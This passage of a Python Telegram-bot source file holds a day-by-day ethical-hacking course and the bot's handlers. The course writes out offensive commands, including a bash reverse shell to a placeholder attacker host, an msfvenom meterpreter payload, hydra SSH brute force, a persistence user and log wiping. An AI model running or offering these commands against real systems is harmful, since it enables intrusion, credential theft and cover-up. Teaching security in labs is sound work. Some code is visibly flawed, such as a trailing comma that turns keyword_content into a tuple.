    "- Command Injection vs RCE\n"
    "- Indicators of Vulnerability\n"
    "- Practical Exploits\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Identify vulnerable forms (e.g., ping, name fields)\n"
    "2. Inject commands like `; id` or `| whoami`\n"
    "3. Setup a Netcat listener to capture shell\n\n"
    "*✅ Outcome:* Able to identify and exploit command injection flaws.",

  "day13": "*📅 Day 13: Privilege Escalation Basics*\n\n"
    "After exploitation, elevate privileges for deeper control.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Types of Privilege Escalation (Vertical & Horizontal)\n"
    "- Linux & Windows PrivEsc Techniques\n"
    "- Common misconfigurations\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Use `sudo -l` or weak SUID binaries\n"
    "2. Use `winPEAS` and `linPEAS` enumeration tools\n"
    "3. Exploit kernel or permission issues\n\n"
    "*✅ Outcome:* Understand and perform privilege escalation.",

  "day14": "*📅 Day 14: Password Cracking*\n\n"
    "Learn how attackers break passwords and how to protect them.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Hashes vs Encryption\n"
    "- Dictionary & Brute Force Attacks\n"
    "- Tools: JohnTheRipper, Hashcat\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Use `john` to crack `/etc/shadow` sample\n"
    "2. Use `hashid` to identify hash types\n"
    "3. Try a bruteforce with `hydra` on SSH\n\n"
    "*✅ Outcome:* Familiar with cracking tools and password security.",

  "day15": "*📅 Day 15: Wireless Hacking Basics (WiFi)*\n\n"
    "Targeting wireless networks opens up a lot of possibilities.\n\n"
    "*🧠 Topics Covered:*\n"
    "- WiFi encryption (WEP/WPA/WPA2)\n"
    "- Monitor & Packet Injection\n"
    "- Tools: Airmon-ng, Airodump-ng, Aircrack-ng\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Enable monitor mode: `airmon-ng start wlan0`\n"
    "2. Capture handshake: `airodump-ng wlan0mon`\n"
    "3. Crack handshake with `aircrack-ng` + wordlist\n\n"
    "*✅ Outcome:* Able to analyze WiFi traffic and attempt WEP/WPA crack.",

      "day16": "*📅 Day 16: Reverse Shells*\n\n"
    "Learn how to gain remote access to a compromised system.\n\n"
    "*🧠 Topics Covered:*\n"
    "- What is a reverse shell\n"
    "- TCP vs HTTP reverse shell\n"
    "- Tools: Netcat, Bash, PHP, Python\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Start a Netcat listener: `nc -lvnp 4444`\n"
    "2. Trigger a reverse shell from target: `bash -i >& /dev/tcp/attacker_ip/4444 0>&1`\n"
    "3. Try reverse shell payloads in PHP/Python\n\n"
    "*✅ Outcome:* Can execute reverse shells and receive connections.",

  "day17": "*📅 Day 17: Post Exploitation Basics*\n\n"
    "After access, what’s next? Learn how to maintain and leverage access.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Collecting information (credentials, users, history)\n"
    "- Persistence Techniques\n"
    "- Cleaning up traces\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Use `cat /etc/passwd`, `who`, `history`, `netstat`\n"
    "2. Add a new user to keep access\n"
    "3. Remove logs using `> ~/.bash_history`\n\n"
    "*✅ Outcome:* Able to operate and maintain access after exploitation.",

  "day18": "*📅 Day 18: Web Shells and PHP Exploits*\n\n"
    "Use web shells to control a vulnerable web server.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Web shell basics (PHP/ASP)\n"
    "- Common upload vulnerabilities\n"
    "- Tools: Weevely, b374k\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Upload a web shell to DVWA\n"
    "2. Access shell via browser\n"
    "3. Use `weevely` to gain access\n\n"
    "*✅ Outcome:* Able to use and manage a web shell session.",

  "day19": "*📅 Day 19: Client-Side Attacks & Social Engineering*\n\n"
    "Fool the human — the weakest link in cybersecurity.\n\n"
    "*🧠 Topics Covered:*\n"
    "- What is Social Engineering\n"
    "- Creating fake login pages\n"
    "- USB Rubber Ducky, Phishing Kits\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Use `SEToolkit` to clone a login page\n"
    "2. Host a phishing page on localhost\n"
    "3. Send fake link via LAN or email (lab only)\n\n"
    "*✅ Outcome:* Understand social engineering and phishing strategies.",

  "day20": "*📅 Day 20: Malware Basics*\n\n"
    "Create, analyze, and understand basic malware behavior.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Types of Malware\n"
    "- Common Techniques\n"
    "- Payload Generation with msfvenom\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Use `msfvenom` to create payload\n"
    "   Example: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe > payload.exe`\n"
    "2. Setup listener in Metasploit\n"
    "3. Run on VM to test (do NOT use on real systems)\n\n"
    "*✅ Outcome:* Able to generate and test simple payloads in a safe lab.",

    "day21": "*📅 Day 21: Windows Hacking*\n\n"
    "Understand Windows-specific vulnerabilities and techniques.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Windows privilege escalation paths\n"
    "- Exploiting services and misconfigurations\n"
    "- Using PowerShell for exploitation\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Enumerate Windows system info: `systeminfo`, `whoami`, `net user`\n"
    "2. Use `winPEAS` or `PowerUp` for enumeration\n"
    "3. Try local exploit (MS10-092 or similar in lab)\n\n"
    "*✅ Outcome:* Can analyze and attempt privilege escalation on Windows targets.",

  "day22": "*📅 Day 22: Linux Hacking*\n\n"
    "Focus on hacking Linux-based systems.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Linux enumeration and privilege escalation\n"
    "- Exploiting SUID, cron jobs, and writable scripts\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Check for SUID binaries: `find / -perm -4000 2>/dev/null`\n"
    "2. Exploit writable cron job or misconfigured scripts\n"
    "3. Use `linPEAS` to find privilege escalation paths\n\n"
    "*✅ Outcome:* Can enumerate and exploit common Linux privilege escalation vectors.",

  "day23": "*📅 Day 23: Web App Hacking - XSS, CSRF, IDOR*\n\n"
    "Deep dive into modern web vulnerabilities.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Cross-Site Scripting (XSS)\n"
    "- CSRF (Cross-Site Request Forgery)\n"
    "- Insecure Direct Object References (IDOR)\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Practice XSS in DVWA and PortSwigger labs\n"
    "2. Simulate CSRF in a form submission\n"
    "3. Exploit IDOR by changing object IDs in URLs\n\n"
    "*✅ Outcome:* Can identify and exploit common web application flaws.",

  "day24": "*📅 Day 24: Cryptography Basics*\n\n"
    "Understand the use of encryption and its weaknesses.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Hashing vs Encryption\n"
    "- Common algorithms (MD5, SHA1, AES)\n"
    "- Cracking hashes with `hashcat`, `john`\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Generate and crack hashes using `john`\n"
    "2. Create AES encrypted messages using Python\n"
    "3. Try cracking leaked hash dumps\n\n"
    "*✅ Outcome:* Understand how cryptography can be used and abused in hacking.",

  "day25": "*📅 Day 25: Bug Bounty 101*\n\n"
    "Step into the world of legal hacking and rewards.\n\n"
    "*🧠 Topics Covered:*\n"
    "- What is Bug Bounty\n"
    "- Platforms: HackerOne, Bugcrowd\n"
    "- Vulnerability Disclosure Process\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Create an account on HackerOne or Bugcrowd\n"
    "2. Read 5 disclosed reports\n"
    "3. Try recon on a public program\n\n"
    "*✅ Outcome:* Get started in bug bounty hunting and reporting.",

  "day26": "*📅 Day 26: Vulnerability Scanning & Reporting*\n\n"
    "Learn how to scan and document findings professionally.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Tools: Nessus, OpenVAS, Nikto\n"
    "- Writing quality reports\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Scan with `nikto`, `nmap --script vuln`, or OpenVAS\n"
    "2. Create a PDF report with impact and remediation\n\n"
    "*✅ Outcome:* Able to generate, interpret scans and document vulnerabilities.",

  "day27": "*📅 Day 27: Malware Analysis Basics*\n\n"
    "Analyze malware behavior in a sandboxed environment.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Static vs Dynamic analysis\n"
    "- Tools: strings, binwalk, Cuckoo Sandbox\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Analyze suspicious files with `strings` and `file`\n"
    "2. Run malware in Cuckoo sandbox VM\n"
    "3. Extract indicators of compromise (IOCs)\n\n"
    "*✅ Outcome:* Can perform basic malware analysis and extract behavior.",

  "day28": "*📅 Day 28: Red Team vs Blue Team*\n\n"
    "Understand both offense and defense in cybersecurity.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Red Team (Attackers) TTPs\n"
    "- Blue Team (Defenders) techniques\n"
    "- Detection and logging\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Simulate attacks with Metasploit and monitor logs\n"
    "2. Use Splunk/ELK for detection\n\n"
    "*✅ Outcome:* Gain perspective on defense and offense synergy.",

  "day29": "*📅 Day 29: Full Hack Simulation*\n\n"
    "Test your combined skills in a full scenario.\n\n"
    "*🧠 Topics Covered:*\n"
    "- Recon to exploitation to privilege escalation\n"
    "- Data exfiltration and cleanup\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Choose a vulnerable VM (TryHackMe, VulnHub)\n"
    "2. Perform full chain: recon, exploit, escalate, exfiltrate\n\n"
    "*✅ Outcome:* Ready to conduct end-to-end penetration tests.",

  "day30": "*📅 Day 30: Graduation & Next Steps*\n\n"
    "You’ve completed the journey — where do you go next?\n\n"
    "*🧠 Topics Covered:*\n"
    "- Certifications: OSCP, CEH, PNPT\n"
    "- Career Paths: Red Teamer, Pentester, Analyst\n"
    "- Building a Portfolio\n\n"
    "*🛠️ Practical Tasks:*\n"
    "1. Setup GitHub to document your learning\n"
    "2. Contribute to open-source security tools\n"
    "3. Apply for internships or research roles\n\n"
    "*✅ Outcome:* Equipped to move into real-world hacking and security roles.",

}

keyword_content = {
    "nikto": content["nikto"],
    "linux command": content["LC"],
    "linux commands": content["LC"],
    "about linux": content["LC"],
    "nmap": content["nmap"],
    "cowsay": "🐮 *cowsay* lets an ASCII cow speak your message:\n`sudo apt install cowsay`\nExample: `cowsay Hello, Hacker!`",
    "cmatrix": "🟢 *Matrix Rain Effect (cmatrix)*:\n`sudo apt install cmatrix`\nRun with: `cmatrix`",
    "sl": "🚂 *Steam Locomotive (sl)*: A funny tool when you mistype `ls`\n`sudo apt install sl`",
    "lolcat": "🌈 *Colorful Output (lolcat)*: Pipe any command into `lolcat` for rainbow output.\n`echo Hello | lolcat`",
    "asciiquarium": "🐠 *ASCII Aquarium*: `asciiquarium` shows fish in terminal.\nInstall with: `sudo apt install libcurses-perl && wget https://raw.githubusercontent.com/cmatsuoka/asciiquarium/master/asciiquarium -O /usr/local/bin/asciiquarium && chmod +x /usr/local/bin/asciiquarium`",
    "telnet star wars": "⭐ *Star Wars in ASCII*:\n`telnet towel.blinkenlights.nl`",
    "figlet": "🔤 *FIGlet*: Convert text into ASCII banner font:\n`sudo apt install figlet`\n`figlet H4cker`",
    "toilet": "🚽 *toilet*: Similar to `figlet` but with effects.\n`sudo apt install toilet`",
    "rev": "🔁 *rev*: Reverses input text.\n`echo hello | rev` → `olleh`",
    "yes": "🔁 *yes*: Prints text repeatedly.\n`yes I am a hacker`",

    "hacker": "💻 *Hacker Mode*: Use `hollywood` for a simulated hacker terminal effect.\n`sudo apt install hollywood`\nRun with: `hollywood`",
    "oneko": "🐱 *Oneko*: A cat chases your cursor.\n`sudo apt install oneko`\nRun with: `oneko`",
    "aafire": "🔥 *ASCII Fire*: Displays fire animation in terminal.\n`sudo apt install aafire`\nRun with: `aafire`",
    "h4cker": "👾 *H4cker Bot*: Type `/start` to interact with the bot and learn hacking topics.",
},


def get_keyboard(topic):
    buttons = [[InlineKeyboardButton(text, callback_data=data)] for text, data in topics.get(topic, [])]
    if topic != "main":
        buttons.append([InlineKeyboardButton("⬅️ Back", callback_data="main")])
    return InlineKeyboardMarkup(buttons)


# --- /start Handler ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 Hey! I am *H4cker Bot* 🤖\n\nI'm here to teach you Ethical Hacking and inspire your cybersecurity journey! Choose a topic below:",
        parse_mode="Markdown",
        reply_markup=get_keyboard("main")
    )


# --- Greeting Handler (hi/hello) ---
async def greet_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message.text.lower().strip()
    if msg in ["hi", "hello", "hii", "/start"]:
        await start(update, context)


# --- Callback Query Handler for Buttons ---
async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    topic_key = query.data

    if topic_key in topics:
        await query.message.reply_text(
            text=content.get(topic_key, f"*{topic_key.capitalize()} Topics:*"),
            parse_mode="Markdown",
            reply_markup=get_keyboard(topic_key)
        )
    elif topic_key in content:
        await query.message.reply_text(
            text=content[topic_key],
            parse_mode="Markdown",
            # reply_markup=get_keyboard("main")
        )
    else:
        await query.message.reply_text("❌ Invalid option. Please try again.")


# --- Keyword/Text Handler with Fuzzy Matching ---
async def keyword_responder(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message.text.lower().strip()

    # Check exact match
    if msg in keyword_content:
        await update.message.reply_text(keyword_content[msg], parse_mode="Markdown")
        return

    # Try fuzzy match
    matches = difflib.get_close_matches(msg, keyword_content.keys(), n=1, cutoff=0.6)
    if matches:
        await update.message.reply_text(
            f"🔍 Showing result for *{matches[0]}*:\n\n{keyword_content[matches[0]]}",
            parse_mode="Markdown"
        )
        return

    # Not found
    await update.message.reply_text("❌ I couldn't find info on that. Try typing a valid hacking keyword or use /start.")


if __name__ == '__main__':
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(handle_buttons))

    print("✅ H4cker Bot is running...")
    app.run_polling()
